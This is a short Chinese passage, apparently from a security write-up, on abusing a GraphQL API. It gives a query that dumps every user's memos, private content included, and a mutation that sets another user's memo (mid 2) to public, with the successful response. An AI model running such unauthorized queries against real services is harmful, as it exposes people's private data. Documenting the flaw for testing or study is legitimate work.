通过如下查询，可以获取所有用户的所有memos信息：

query {
allUsers {
edges {
node {
username
memos {
edges {
node {
id
private
content
}
}
}
}
}
}
}

测试GraphQL的所有功能，发现memos有一个private字段，并提供了修改功能可以修改这个字段值，构造修改查询，可以看到mid等于2可以修改成 功

修改private属性为false

mutation{
updateMemoInfo(title:”testaaa”,mid:2,private:false){
ok
}
}

返回

{
“data”: {
“updateMemoInfo”: {
“ok”: true
}
}
}
